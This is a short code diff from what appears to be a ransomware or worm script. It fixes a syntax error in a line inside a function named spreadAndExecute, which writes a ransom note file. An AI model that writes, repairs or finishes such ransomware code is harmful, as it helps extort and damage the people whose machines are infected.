@@ -97,7 +97,7 @@ def spreadAndExecute(sshClient):
 
 	##Create a ransome Notes
 	f= open("READMEUSRFILE.txt","W")
-	f.write("I Need a Dollar"\n)
+	f.write("I Need a Dollar\n")
 	f.close()
 
 	pass
